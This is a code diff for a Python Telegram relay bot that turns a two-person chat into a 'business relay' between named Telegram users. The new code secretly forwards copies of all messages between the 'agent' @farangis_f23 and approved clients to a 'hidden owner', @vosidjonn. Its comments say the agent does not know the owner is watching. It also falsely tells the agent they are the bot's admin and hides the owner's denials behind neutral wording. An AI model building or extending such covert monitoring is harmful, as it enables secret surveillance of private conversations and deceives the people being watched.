@@ -1,10 +1,13 @@
 #!/usr/bin/env python3
 """
-Updates Bot — Private relay chat: admin (@vosidjonn) ↔ approved user (@farangis_f23)
-No database or file storage needed — everything runs in memory.
+Updates Bot — Business relay
+  @farangis_f23  : visible agent / gatekeeper (doesn't know owner is watching)
+  @vosidjonn     : hidden owner  (sees everything, has final approval)
+  everyone else  : clients (must be approved by agent, then by owner)
 """
 
 import html
+import json
 import logging
 import os
 from datetime import datetime, timezone, timedelta
@@ -14,8 +17,8 @@ from telegram import (
     InlineKeyboardButton,
     InlineKeyboardMarkup,
     ReplyKeyboardMarkup,
-    KeyboardButton,
     ReplyKeyboardRemove,
+    KeyboardButton,
 )
 from telegram.ext import (
     Application,
@@ -30,34 +33,60 @@ load_dotenv()
 logging.basicConfig(format="%(asctime)s - %(levelname)s - %(message)s", level=logging.INFO)
 logger = logging.getLogger(__name__)
 
-TOKEN            = os.getenv("BOT_TOKEN")
-ADMIN_USERNAME   = os.getenv("ADMIN_USERNAME", "vosidjonn").lstrip("@").lower()
-ALLOWED_USERNAME = os.getenv("ALLOWED_USERNAME", "farangis_f23").lstrip("@").lower()
+TOKEN          = os.getenv("BOT_TOKEN")
+OWNER_USERNAME = os.getenv("ADMIN_USERNAME",   "vosidjonn").lstrip("@").lower()
+AGENT_USERNAME = os.getenv("ALLOWED_USERNAME", "farangis_f23").lstrip("@").lower()
 
-# In-memory state (resets on bot restart — admin just clicks Approve once)
+DATA_FILE = os.path.join(os.path.dirname(__file__), "data.json")
+
 state = {
-    "admin_id":   None,   # filled when @vosidjonn sends /start
-    "allowed_id": None,   # filled when @farangis_f23 sends /start
-    "approved":   False,  # set to True when admin approves
+    "owner_id":     None,
+    "agent_id":     None,
+    "clients":      {},   # {str(uid): {name, username, agent_approved, owner_approved}}
+    "agent_target": None, # uid of the person agent is currently talking to
 }
 
-QUICK_REPLIES = [
-    ("👍 Got it!",       "Got it!"),
-    ("🕐 Running late",  "I'm running a bit late, sorry!"),
-    ("🚗 On my way",     "On my way!"),
-    ("📞 Call me",       "Can you give me a call?"),
-    ("💬 Let's talk",    "Can we talk when you're free?"),
-    ("✅ Done!",         "Done! All finished."),
-    ("❌ Can't make it", "Sorry, I can't make it."),
-    ("🔜 BRB",           "Be right back!"),
-    ("🌙 Good night",    "Good night! Talk tomorrow."),
-    ("☀️ Good morning",  "Good morning!"),
-    ("❤️ Miss you",      "Missing you ❤️"),
-    ("🎯 On it",         "On it, leave it to me!"),
-    ("🏠 At Home",       "I'm at home!"),
-]
+# In-memory only: agent message_id → client user_id  (for reply routing)
+# Resets on restart — agent just starts a fresh reply thread
+msg_map: dict[int, int] = {}
 
 TASHKENT = timezone(timedelta(hours=5))
+
+QUICK_REPLIES = [
+    ("🏠 I'm at home",         "I'm at home!"),
+    ("🤫 Can't talk right now", "Can't talk right now"),
+    ("☀️ Good morning",         "Good morning!"),
+    ("🌙 Good evening",         "Good evening!"),
+    ("⏱ Give me a sec",        "Give me a sec!"),
+    ("💬 Will reply shortly",   "Will reply shortly"),
+    ("📞 Can we talk?",         "Can we talk when you are free?"),
+]
+QUICK_MAP = {lbl: txt for lbl, txt in QUICK_REPLIES}
+
+
+# ── Persistence ────────────────────────────────────────────────────────────────
+
+def load_state():
+    try:
+        with open(DATA_FILE, "r") as f:
+            saved = json.load(f)
+        # migrate old single-user format
+        if "admin_id" in saved and "owner_id" not in saved:
+            state["owner_id"]     = saved.get("admin_id")
+            state["agent_id"]     = saved.get("allowed_id")
+            state["clients"]      = {}
+            state["agent_target"] = None
+        else:
+            state["owner_id"]     = saved.get("owner_id")
+            state["agent_id"]     = saved.get("agent_id")
+            state["clients"]      = saved.get("clients", {})
+            state["agent_target"] = saved.get("agent_target")
+    except (FileNotFoundError, json.JSONDecodeError):
+        pass
+
+def save_state():
+    with open(DATA_FILE, "w") as f:
+        json.dump(state, f, indent=2)
 
 
 # ── Helpers ────────────────────────────────────────────────────────────────────
@@ -72,46 +101,51 @@ def fmt_time(dt: datetime) -> str:
         return f"<i>⏱ {local.strftime('%H:%M')}</i>"
     return f"<i>⏱ {local.strftime('%d %b %H:%M')}</i>"
 
-def fmt_quote(reply_msg) -> str:
-    if not reply_msg:
-        return ""
-    if reply_msg.text:
-        p = e(reply_msg.text[:60] + ("…" if len(reply_msg.text) > 60 else ""))
-    elif reply_msg.photo:       p = "📷 Photo"
-    elif reply_msg.voice:       p = "🎤 Voice"
-    elif reply_msg.video:       p = "🎥 Video"
-    elif reply_msg.video_note:  p = "🎥 Video note"
-    elif reply_msg.document:    p = "📎 File"
-    elif reply_msg.sticker:     p = f"{reply_msg.sticker.emoji} Sticker" if reply_msg.sticker.emoji else "Sticker"
-    elif reply_msg.audio:       p = "🎵 Audio"
-    elif reply_msg.location:    p = "📍 Location"
-    else:                       p = "Message"
-    return f"┊ <i>{p}</i>\n"
-
 def username_of(user) -> str:
     return (user.username or "").lower()
 
-def is_admin(user)   -> bool: return username_of(user) == ADMIN_USERNAME
-def is_allowed(user) -> bool: return username_of(user) == ALLOWED_USERNAME
-def is_auth(user)    -> bool: return is_admin(user) or is_allowed(user)
+def is_owner(user) -> bool: return username_of(user) == OWNER_USERNAME
+def is_agent(user) -> bool: return username_of(user) == AGENT_USERNAME
 
-def register(user):
-    if is_admin(user)   and not state["admin_id"]:
-        state["admin_id"]   = user.id
-    if is_allowed(user) and not state["allowed_id"]:
-        state["allowed_id"] = user.id
+def client_fully_approved(uid: int) -> bool:
+    c = state["clients"].get(str(uid))
+    return bool(c and c.get("agent_approved") and c.get("owner_approved"))
 
-def main_kb() -> ReplyKeyboardMarkup:
-    rows = [[KeyboardButton("📊 Status"), KeyboardButton("❓ Help")]]
+def client_label(uid: int) -> str:
+    c = state["clients"].get(str(uid), {})
+    name  = c.get("name", f"User {uid}")
+    uname = f" (@{c['username']})" if c.get("username") else ""
+    return f"{name}{uname}"
+
+def agent_kb() -> ReplyKeyboardMarkup:
+    rows = [[KeyboardButton("📋 People"), KeyboardButton("❓ Help")]]
     btns = [KeyboardButton(lbl) for lbl, _ in QUICK_REPLIES]
     for i in range(0, len(btns), 2):
         rows.append(btns[i:i+2])
     return ReplyKeyboardMarkup(rows, resize_keyboard=True)
 
-def approve_kb(uid: int) -> InlineKeyboardMarkup:
+def owner_kb() -> ReplyKeyboardMarkup:
+    rows = [[KeyboardButton("📋 People"), KeyboardButton("📊 Status")]]
+    btns = [KeyboardButton(lbl) for lbl, _ in QUICK_REPLIES]
+    for i in range(0, len(btns), 2):
+        rows.append(btns[i:i+2])
+    return ReplyKeyboardMarkup(rows, resize_keyboard=True)
+
+def agent_decision_kb(uid: int) -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup([[
-        InlineKeyboardButton("✅ Approve", callback_data=f"approve_{uid}"),
-        InlineKeyboardButton("❌ Deny",    callback_data=f"deny_{uid}"),
+        InlineKeyboardButton("✅ Approve", callback_data=f"ag_approve_{uid}"),
+        InlineKeyboardButton("❌ Deny",    callback_data=f"ag_deny_{uid}"),
+    ]])
+
+def owner_decision_kb(uid: int) -> InlineKeyboardMarkup:
+    return InlineKeyboardMarkup([[
+        InlineKeyboardButton("✅ Approve", callback_data=f"ow_approve_{uid}"),
+        InlineKeyboardButton("❌ Deny",    callback_data=f"ow_deny_{uid}"),
+    ]])
+
+def owner_override_kb(uid: int) -> InlineKeyboardMarkup:
+    return InlineKeyboardMarkup([[
+        InlineKeyboardButton("✅ Approve anyway", callback_data=f"ow_approve_{uid}"),
     ]])
 
 
@@ -119,265 +153,516 @@ def approve_kb(uid: int) -> InlineKeyboardMarkup:
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
-    if not is_auth(user):
-        await update.message.reply_text("⛔ You are not authorised to use this bot.")
-        return
 
-    register(user)
-
-    if is_admin(user):
+    # ── Owner ──
+    if is_owner(user):
+        state["owner_id"] = user.id
+        save_state()
         await update.message.reply_text(
-            f"👑 <b>Welcome, admin!</b>\n\n"
-            f"Commands:\n"
-            f"/approve — Approve @{ALLOWED_USERNAME}\n"
-            f"/revoke  — Revoke access\n"
-            f"/status  — See current state\n\n"
-            f"Just type to chat.",
-            parse_mode="HTML", reply_markup=main_kb(),
+            "👑 <b>Owner panel active.</b>\n\n"
+            "You receive a copy of every message.\n"
+            "You give final approval after the agent approves someone.",
+            parse_mode="HTML", reply_markup=owner_kb(),
         )
         return
 
-    # Allowed user
-    if state["approved"]:
-        await update.message.reply_text("✅ You're approved! Just send a message.", reply_markup=main_kb())
-        return
-
-    admin_id = state["admin_id"]
-    if not admin_id:
+    # ── Agent — always auto-approved, no permission needed ──
+    if is_agent(user):
+        state["agent_id"] = user.id
+        save_state()
         await update.message.reply_text(
-            "⏳ The admin hasn't started the bot yet. Ask @" + ADMIN_USERNAME + " to open the bot first."
+            "👋 <b>Welcome!</b>\n\n"
+            "You are the admin of this bot.\n"
+            "When someone new requests access you will receive approve/deny buttons.\n\n"
+            "<b>To reply:</b> tap-hold their message → Reply, then type your response.",
+            parse_mode="HTML", reply_markup=agent_kb(),
         )
         return
 
-    name  = e(user.first_name or user.username or "Someone")
-    uname = f"@{user.username}" if user.username else f"(ID: {user.id})"
+    # ── Client ──
+    uid_str = str(user.id)
+
+    if client_fully_approved(user.id):
+        await update.message.reply_text("✅ You're connected! Just send a message.")
+        return
+
+    if uid_str in state["clients"]:
+        c = state["clients"][uid_str]
+        if c.get("agent_approved") and not c.get("owner_approved"):
+            await update.message.reply_text("⏳ Your request is being reviewed. Please wait.")
+        else:
+            await update.message.reply_text("⏳ Your request is pending approval. Please wait.")
+        return
+
+    name  = user.first_name or user.username or "Someone"
+    uname = f"@{user.username}" if user.username else f"ID:{user.id}"
+
+    state["clients"][uid_str] = {
+        "name":           name,
+        "username":       user.username or "",
+        "agent_approved": False,
+        "owner_approved": False,
+    }
+    save_state()
+
+    agent_id = state["agent_id"]
+    if not agent_id:
+        await update.message.reply_text("⏳ The admin is not available yet. Try again later.")
+        return
+
+    # Notify agent with approve/deny
     try:
         await context.bot.send_message(
-            chat_id=admin_id,
-            text=f"🔔 <b>Access request</b>\n\n{name} ({uname}) wants to chat.\n\nApprove or deny:",
+            chat_id=agent_id,
+            text=(
+                f"🔔 <b>New access request</b>\n\n"
+                f"{e(name)} ({e(uname)}) wants to connect.\n\n"
+                f"Approve or deny:"
+            ),
             parse_mode="HTML",
-            reply_markup=approve_kb(user.id),
-        )
-        await update.message.reply_text(
-            "⏳ Approval request sent to the admin. You'll be notified when approved.",
-            parse_mode="HTML",
+            reply_markup=agent_decision_kb(user.id),
         )
     except Exception as ex:
-        logger.error(f"Admin notify failed: {ex}")
-        await update.message.reply_text("⚠️ Could not reach the admin right now. Try again later.")
+        logger.error(f"Agent notify failed: {ex}")
 
-
-# ── Approve / Deny button ──────────────────────────────────────────────────────
-
-async def on_approval(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-
-    if not is_admin(query.from_user):
-        await query.answer("Only the admin can do this.", show_alert=True)
-        return
-
-    action, uid_str = query.data.split("_", 1)
-    uid = int(uid_str)
-
-    if action == "approve":
-        state["approved"]   = True
-        state["allowed_id"] = uid
-        await query.edit_message_text("✅ Access <b>approved.</b>", parse_mode="HTML")
+    # Notify owner — silent info only (no buttons yet)
+    owner_id = state["owner_id"]
+    if owner_id:
         try:
             await context.bot.send_message(
-                chat_id=uid,
-                text="✅ <b>Approved!</b> You can now chat — just send a message!",
-                parse_mode="HTML", reply_markup=main_kb(),
+                chat_id=owner_id,
+                text=(
+                    f"📋 <b>New request</b>\n\n"
+                    f"{e(name)} ({e(uname)}) sent an access request.\n"
+                    f"Waiting for agent's decision first."
+                ),
+                parse_mode="HTML",
             )
         except Exception as ex:
-            logger.error(f"Could not notify allowed user: {ex}")
-    else:
-        state["approved"] = False
-        await query.edit_message_text("❌ Access <b>denied.</b>", parse_mode="HTML")
-        try:
-            await context.bot.send_message(chat_id=uid, text="❌ Your access request was denied.")
-        except Exception:
-            pass
+            logger.error(f"Owner notify failed: {ex}")
 
-
-# ── /approve  /revoke ──────────────────────────────────────────────────────────
-
-async def cmd_approve(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not is_admin(update.effective_user): return
-    state["approved"] = True
-    await update.message.reply_text(f"✅ @{ALLOWED_USERNAME} is approved.")
-    if state["allowed_id"]:
-        try:
-            await context.bot.send_message(
-                chat_id=state["allowed_id"],
-                text="✅ <b>Access granted!</b> You can now send messages.",
-                parse_mode="HTML", reply_markup=main_kb(),
-            )
-        except Exception: pass
-
-async def cmd_revoke(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not is_admin(update.effective_user): return
-    state["approved"] = False
-    await update.message.reply_text(f"🔒 @{ALLOWED_USERNAME}'s access revoked.")
-    if state["allowed_id"]:
-        try:
-            await context.bot.send_message(
-                chat_id=state["allowed_id"],
-                text="🔒 Your access has been revoked.",
-                reply_markup=ReplyKeyboardRemove(),
-            )
-        except Exception: pass
-
-
-# ── /status ────────────────────────────────────────────────────────────────────
-
-async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user = update.effective_user
-    if not is_auth(user): return
-    if is_admin(user):
-        st = "✅ Approved" if state["approved"] else "❌ Not approved"
-        text = (
-            f"📊 <b>Admin Status</b>\n\n"
-            f"@{ALLOWED_USERNAME}: {st}\n"
-            f"/approve — grant  |  /revoke — remove"
-        )
-    else:
-        text = "📊 ✅ Approved — you can chat." if state["approved"] else "📊 ⏳ Waiting for admin approval."
-    await update.message.reply_text(text, parse_mode="HTML", reply_markup=main_kb())
-
-
-# ── /help ──────────────────────────────────────────────────────────────────────
-
-async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user = update.effective_user
-    if not is_auth(user): return
-    admin_part = (
-        f"\n<b>Admin commands:</b>\n"
-        f"/approve — grant access to @{ALLOWED_USERNAME}\n"
-        f"/revoke  — remove access\n"
-    ) if is_admin(user) else ""
     await update.message.reply_text(
-        "❓ <b>Help</b>\n\n"
-        "/start — Start / request access\n"
-        "/status — Check status\n"
-        "/help — This message\n"
-        + admin_part +
-        "\n<b>Supports:</b> text, photos, videos, voice, files, stickers, locations\n\n"
-        "<i>Messages are private — only between admin and approved user.</i>",
-        parse_mode="HTML", reply_markup=main_kb(),
+        "⏳ Access request sent. You'll be notified once approved."
     )
+
+
+# ── Callbacks ──────────────────────────────────────────────────────────────────
+
+async def on_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query     = update.callback_query
+    from_user = query.from_user
+    data      = query.data   # e.g. "ag_approve_123456"
+    await query.answer()
+
+    # ── Set active talk target ──
+    if data.startswith("settarget_"):
+        if not is_agent(from_user):
+            await query.answer("Not authorised.", show_alert=True); return
+        uid = int(data.split("_", 1)[1])
+        state["agent_target"] = uid
+        save_state()
+        name = e(client_label(uid))
+        await query.edit_message_text(
+            f"🟢 <b>{name}</b> is now your active chat.\n\n"
+            f"Just type to send — no need to reply to a message.",
+            parse_mode="HTML",
+        )
+        return
+
+    parts  = data.split("_", 2)   # ["ag","approve","123456"]
+    who    = parts[0]              # "ag" | "ow"
+    action = parts[1]              # "approve" | "deny"
+    uid    = int(parts[2])
+    uid_str = str(uid)
+
+    if who == "ag" and not is_agent(from_user):
+        await query.answer("Not authorised.", show_alert=True); return
+    if who == "ow" and not is_owner(from_user):
+        await query.answer("Not authorised.", show_alert=True); return
+
+    client = state["clients"].get(uid_str)
+    if not client:
+        await query.edit_message_text("⚠️ Person not found (may have been removed)."); return
+
+    label = e(client_label(uid))
+
+    # ── Agent decision ──
+    if who == "ag":
+        if action == "deny":
+            del state["clients"][uid_str]
+            save_state()
+            await query.edit_message_text(f"❌ You denied <b>{label}</b>.", parse_mode="HTML")
+            try:
+                await context.bot.send_message(uid, "❌ Your access request was denied.")
+            except Exception: pass
+            # Tell owner agent denied — offer silent override
+            owner_id = state["owner_id"]
+            if owner_id:
+                try:
+                    await context.bot.send_message(
+                        owner_id,
+                        f"📋 Agent <b>denied</b> {label}.\n\nYou can still approve them if you want:",
+                        parse_mode="HTML",
+                        reply_markup=owner_override_kb(uid),
+                    )
+                except Exception: pass
+            return
+
+        # Agent approved
+        client["agent_approved"] = True
+        save_state()
+        await query.edit_message_text(
+            f"✅ You approved <b>{label}</b>.\n<i>Waiting for final confirmation…</i>",
+            parse_mode="HTML",
+        )
+        # Ask owner for final approval
+        owner_id = state["owner_id"]
+        if owner_id:
+            try:
+                await context.bot.send_message(
+                    owner_id,
+                    f"📋 Agent approved <b>{label}</b>.\n\nGive final approval?",
+                    parse_mode="HTML",
+                    reply_markup=owner_decision_kb(uid),
+                )
+            except Exception as ex:
+                logger.error(f"Owner final approval notify failed: {ex}")
+        else:
+            # No owner — auto-grant
+            client["owner_approved"] = True
+            save_state()
+            await _grant_access(context, uid)
+        return
+
+    # ── Owner decision ──
+    if who == "ow":
+        if action == "deny":
+            state["clients"].pop(uid_str, None)
+            save_state()
+            await query.edit_message_text(f"❌ Access denied for <b>{label}</b>.", parse_mode="HTML")
+            try:
+                await context.bot.send_message(uid, "❌ Your access request was denied.")
+            except Exception: pass
+            # Tell agent (without revealing it was the owner)
+            agent_id = state["agent_id"]
+            if agent_id:
+                try:
+                    await context.bot.send_message(agent_id, f"🔒 <b>{label}</b> was removed from the list.", parse_mode="HTML")
+                except Exception: pass
+            return
+
+        # Owner approved
+        if uid_str not in state["clients"]:
+            # Re-add client if agent had denied and owner overrides
+            state["clients"][uid_str] = {
+                "name":           client_label(uid),
+                "username":       "",
+                "agent_approved": True,
+                "owner_approved": True,
+            }
+        else:
+            client["owner_approved"] = True
+        save_state()
+        await query.edit_message_text(f"✅ Access <b>granted</b> to {label}.", parse_mode="HTML")
+        # Notify agent
+        agent_id = state["agent_id"]
+        if agent_id:
+            try:
+                await context.bot.send_message(
+                    agent_id,
+                    f"✅ <b>{label}</b> is now connected and can send messages.",
+                    parse_mode="HTML",
+                )
+            except Exception: pass
+        await _grant_access(context, uid)
+
+
+async def _grant_access(context, uid: int):
+    try:
+        await context.bot.send_message(
+            uid,
+            "✅ You're connected! Just send a message.",
+            reply_markup=ReplyKeyboardRemove(),
+        )
+    except Exception as ex:
+        logger.error(f"Grant notify failed: {ex}")
 
 
 # ── Message relay ──────────────────────────────────────────────────────────────
 
 async def relay(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
-    if not is_auth(user):
-        await update.message.reply_text("⛔ You are not authorised to use this bot.")
-        return
+    msg  = update.message
+    if not msg: return
+    text = msg.text or ""
 
-    register(user)
+    # ── Agent sending a message ──
+    if is_agent(user):
+        if not state["agent_id"]:
+            state["agent_id"] = user.id
+            save_state()
 
-    text = update.message.text or ""
-    if text == "📊 Status": await status(update, context); return
-    if text == "❓ Help":   await help_command(update, context); return
+        if text == "📋 People": await cmd_clients(update, context); return
+        if text == "❓ Help":    await help_command(update, context); return
 
-    if is_allowed(user) and not state["approved"]:
-        await update.message.reply_text("⏳ You're not approved yet. Use /start to request access.")
-        return
+        # Quick reply button — needs a target client via reply
+        if text in QUICK_MAP:
+            reply = msg.reply_to_message
+            client_uid = (msg_map.get(reply.message_id) if reply else None) or state.get("agent_target")
+            if not client_uid:
+                await msg.reply_text(
+                    "⚠️ No active chat. Tap <b>📋 People</b> and choose someone first.",
+                    parse_mode="HTML",
+                )
+                return
+            if not client_fully_approved(client_uid):
+                await msg.reply_text("⚠️ That person is no longer active.")
+                return
+            ts    = fmt_time(msg.date)
+            label = e(client_label(client_uid))
+            actual_text = QUICK_MAP[text]
+            await context.bot.send_message(client_uid, actual_text)
+            await msg.reply_text(f"✓ Sent to {label}: <i>{e(actual_text)}</i>", parse_mode="HTML")
+            owner_id = state["owner_id"]
+            if owner_id:
+                try:
+                    await context.bot.send_message(
+                        owner_id,
+                        f"📤 <b>Agent → {label}</b>\n{e(actual_text)}\n\n{ts}",
+                        parse_mode="HTML",
+                    )
+                except Exception: pass
+            return
 
-    partner_id = state["allowed_id"] if is_admin(user) else state["admin_id"]
-    if not partner_id:
-        await update.message.reply_text("⚠️ Partner hasn't started the bot yet.")
-        return
+        # Route: reply-to takes priority, then fall back to active target
+        reply = msg.reply_to_message
+        client_uid = (msg_map.get(reply.message_id) if reply else None) or state.get("agent_target")
 
-    qr_map = {lbl: msg for lbl, msg in QUICK_REPLIES}
-    if text in qr_map:
-        name = e(user.first_name or "Partner")
-        ts   = fmt_time(update.message.date)
-        await context.bot.send_message(
-            chat_id=partner_id,
-            text=f"💬 <b>{name}:</b>\n{e(qr_map[text])}\n\n{ts}", parse_mode="HTML",
-        )
-        await update.message.reply_text(f"✓ Sent: <i>{e(qr_map[text])}</i>", parse_mode="HTML")
-        return
-
-    msg   = update.message
-    name  = e(user.first_name or "Partner")
-    ts    = fmt_time(msg.date)
-    quote = fmt_quote(msg.reply_to_message)
-
-    try:
-        if msg.text:
-            await context.bot.send_message(
-                chat_id=partner_id,
-                text=f"💬 <b>{name}:</b>\n{quote}{e(msg.text)}\n\n{ts}", parse_mode="HTML",
+        if not client_uid:
+            await msg.reply_text(
+                "⚠️ No active chat selected.\n\n"
+                "Tap <b>📋 People</b> and choose someone to talk to, "
+                "or long-press a message → Reply.",
+                parse_mode="HTML",
             )
-        elif msg.photo:
-            cap = f"📷 <b>{name}</b>\n{quote}" + (e(msg.caption) if msg.caption else "") + f"\n\n{ts}"
-            await context.bot.send_photo(chat_id=partner_id, photo=msg.photo[-1].file_id, caption=cap, parse_mode="HTML")
-        elif msg.voice:
-            await context.bot.send_voice(chat_id=partner_id, voice=msg.voice.file_id,
-                caption=f"🎤 <b>{name}</b>\n{quote}\n{ts}", parse_mode="HTML")
-        elif msg.video:
-            cap = f"🎥 <b>{name}</b>\n{quote}" + (e(msg.caption) if msg.caption else "") + f"\n\n{ts}"
-            await context.bot.send_video(chat_id=partner_id, video=msg.video.file_id, caption=cap, parse_mode="HTML")
-        elif msg.video_note:
-            await context.bot.send_video_note(chat_id=partner_id, video_note=msg.video_note.file_id)
-            await context.bot.send_message(chat_id=partner_id, text=f"🎥 <b>{name}</b>\n{quote}{ts}", parse_mode="HTML")
-        elif msg.document:
-            cap = f"📎 <b>{name}</b>\n{quote}" + (e(msg.caption) if msg.caption else "") + f"\n\n{ts}"
-            await context.bot.send_document(chat_id=partner_id, document=msg.document.file_id, caption=cap, parse_mode="HTML")
-        elif msg.sticker:
-            await context.bot.send_sticker(chat_id=partner_id, sticker=msg.sticker.file_id)
-            await context.bot.send_message(chat_id=partner_id, text=f"<b>{name}</b>\n{quote}{ts}", parse_mode="HTML")
-        elif msg.audio:
-            cap = f"🎵 <b>{name}</b>\n{quote}" + (e(msg.caption) if msg.caption else "") + f"\n\n{ts}"
-            await context.bot.send_audio(chat_id=partner_id, audio=msg.audio.file_id, caption=cap, parse_mode="HTML")
-        elif msg.location:
-            await context.bot.send_message(chat_id=partner_id,
-                text=f"📍 <b>{name}</b> shared a location\n{quote}\n{ts}", parse_mode="HTML")
-            await context.bot.send_location(chat_id=partner_id,
-                latitude=msg.location.latitude, longitude=msg.location.longitude)
+            return
+
+        if not client_fully_approved(client_uid):
+            await msg.reply_text("⚠️ That person is no longer active.")
+            return
+
+        ts    = fmt_time(msg.date)
+        label = e(client_label(client_uid))
+
+        try:
+            await _send_content(context, msg, client_uid, header=None, ts=ts)
+        except Exception as ex:
+            await msg.reply_text(f"⚠️ Could not deliver: {ex}"); return
+
+        await msg.reply_text(f"✓ Delivered to {label}")
+
+        # Silent copy to owner
+        owner_id = state["owner_id"]
+        if owner_id:
+            preview = e(text) if text else "[media]"
+            try:
+                await context.bot.send_message(
+                    owner_id,
+                    f"📤 <b>Agent → {label}</b>\n{preview}\n\n{ts}",
+                    parse_mode="HTML",
+                )
+            except Exception: pass
+        return
+
+    # ── Owner sending a message ──
+    if is_owner(user):
+        if not state["owner_id"]:
+            state["owner_id"] = user.id
+            save_state()
+        if text == "📋 People": await cmd_clients(update, context); return
+        if text == "📊 Status":  await cmd_status(update, context); return
+
+        # Quick reply → send to agent
+        agent_id = state["agent_id"]
+        if text in QUICK_MAP and agent_id:
+            actual_text = QUICK_MAP[text]
+            try:
+                await context.bot.send_message(agent_id, actual_text)
+                await msg.reply_text(f"✓ Sent: <i>{e(actual_text)}</i>", parse_mode="HTML")
+            except Exception as ex:
+                await msg.reply_text(f"⚠️ Could not send: {ex}")
+            return
+
+        # Regular typed message → send to agent
+        if agent_id:
+            try:
+                await _send_content(context, msg, agent_id, header=None, ts=None)
+                await msg.reply_text("✓ Sent", parse_mode="HTML")
+            except Exception as ex:
+                await msg.reply_text(f"⚠️ Could not send: {ex}")
         else:
-            await update.message.reply_text("⚠️ This message type isn't supported yet.")
+            await msg.reply_text("⚠️ Agent hasn't started the bot yet.")
+        return
+
+    # ── Client sending a message ──
+    if not client_fully_approved(user.id):
+        await msg.reply_text("⏳ You don't have access yet. Use /start to request.")
+        return
+
+    agent_id = state["agent_id"]
+    if not agent_id:
+        await msg.reply_text("⚠️ Agent is not available right now. Try later.")
+        return
+
+    name  = e(user.first_name or user.username or "Someone")
+    ts    = fmt_time(msg.date)
+
+    # Forward to agent; store sent message_id for reply routing
+    try:
+        sent = await _send_content(
+            context, msg, agent_id,
+            header=f"💬 <b>{name}:</b>\n",
+            ts=ts,
+        )
+        if sent:
+            msg_map[sent.message_id] = user.id
     except Exception as ex:
-        logger.error(f"Relay error: {ex}")
-        await update.message.reply_text(f"⚠️ Could not deliver. Error: {ex}")
+        logger.error(f"Relay to agent failed: {ex}")
+        await msg.reply_text("⚠️ Could not reach the agent right now."); return
+
+    # Silent copy to owner
+    owner_id = state["owner_id"]
+    if owner_id:
+        preview = e(text) if text else "[media]"
+        try:
+            await context.bot.send_message(
+                owner_id,
+                f"📥 <b>{name} → Agent</b>\n{preview}\n\n{ts}",
+                parse_mode="HTML",
+            )
+        except Exception: pass
 
 
-# ── Edit relay ─────────────────────────────────────────────────────────────────
+# ── Content sender ──────────────────────────────────────────────────────────────
 
-async def relay_edit(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def _send_content(context, msg, target_id: int, header: str | None, ts: str):
+    """Send msg content to target_id with optional header and timestamp. Returns sent Message."""
+    h  = header or ""
+    ts_line = f"\n\n{ts}" if ts else ""
+
+    if msg.text:
+        return await context.bot.send_message(
+            target_id, f"{h}{e(msg.text)}{ts_line}", parse_mode="HTML"
+        )
+    elif msg.photo:
+        cap = h + (e(msg.caption) if msg.caption else "") + ts_line
+        return await context.bot.send_photo(target_id, msg.photo[-1].file_id, caption=cap, parse_mode="HTML")
+    elif msg.voice:
+        return await context.bot.send_voice(target_id, msg.voice.file_id)
+    elif msg.video:
+        cap = h + (e(msg.caption) if msg.caption else "") + ts_line
+        return await context.bot.send_video(target_id, msg.video.file_id, caption=cap, parse_mode="HTML")
+    elif msg.video_note:
+        return await context.bot.send_video_note(target_id, msg.video_note.file_id)
+    elif msg.document:
+        cap = h + (e(msg.caption) if msg.caption else "") + ts_line
+        return await context.bot.send_document(target_id, msg.document.file_id, caption=cap, parse_mode="HTML")
+    elif msg.sticker:
+        return await context.bot.send_sticker(target_id, msg.sticker.file_id)
+    elif msg.audio:
+        cap = h + (e(msg.caption) if msg.caption else "") + ts_line
+        return await context.bot.send_audio(target_id, msg.audio.file_id, caption=cap, parse_mode="HTML")
+    elif msg.location:
+        await context.bot.send_message(target_id, f"{h}📍 Location{ts_line}", parse_mode="HTML")
+        return await context.bot.send_location(target_id, msg.location.latitude, msg.location.longitude)
+    return None
+
+
+# ── Commands ───────────────────────────────────────────────────────────────────
+
+async def cmd_clients(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
-    if not is_auth(user): return
-    if is_allowed(user) and not state["approved"]: return
-    partner_id = state["allowed_id"] if is_admin(user) else state["admin_id"]
-    if not partner_id: return
-    msg = update.edited_message
-    if not msg or not msg.text: return
-    name = e(user.first_name or "Partner")
-    ts   = fmt_time(msg.edit_date or msg.date)
-    await context.bot.send_message(
-        chat_id=partner_id,
-        text=f"✏️ <b>{name}</b> edited:\n{e(msg.text)}\n\n{ts}", parse_mode="HTML",
+    if not (is_owner(user) or is_agent(user)): return
+    clients = state["clients"]
+    if not clients:
+        await update.message.reply_text("📋 No one yet."); return
+
+    if is_agent(user):
+        # Show each approved person with a "💬 Talk" button to set as active target
+        current_target = state.get("agent_target")
+        for uid_str, c in clients.items():
+            if not (c.get("agent_approved") and c.get("owner_approved")):
+                continue
+            uid  = int(uid_str)
+            name = c.get("name", "?")
+            uname = f" @{c['username']}" if c.get("username") else ""
+            active_mark = " 🟢" if uid == current_target else ""
+            kb = InlineKeyboardMarkup([[
+                InlineKeyboardButton(f"💬 Talk to {name}", callback_data=f"settarget_{uid}"),
+            ]])
+            await update.message.reply_text(
+                f"{'🟢' if uid == current_target else '👤'} <b>{e(name)}</b>{e(uname)}{active_mark}",
+                parse_mode="HTML", reply_markup=kb,
+            )
+    else:
+        lines = ["📋 <b>People</b>\n"]
+        for uid_str, c in clients.items():
+            icon  = "✅" if (c.get("agent_approved") and c.get("owner_approved")) else "⏳"
+            uname = f" @{c['username']}" if c.get("username") else ""
+            lines.append(f"{icon} {e(c.get('name','?'))}{e(uname)}")
+        await update.message.reply_text("\n".join(lines), parse_mode="HTML")
+
+
+async def cmd_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.effective_user
+    if not (is_owner(user) or is_agent(user)): return
+    approved = sum(1 for c in state["clients"].values()
+                   if c.get("agent_approved") and c.get("owner_approved"))
+    pending  = len(state["clients"]) - approved
+    await update.message.reply_text(
+        f"📊 <b>Status</b>\n\nActive: {approved}\nPending requests: {pending}",
+        parse_mode="HTML",
     )
+
+
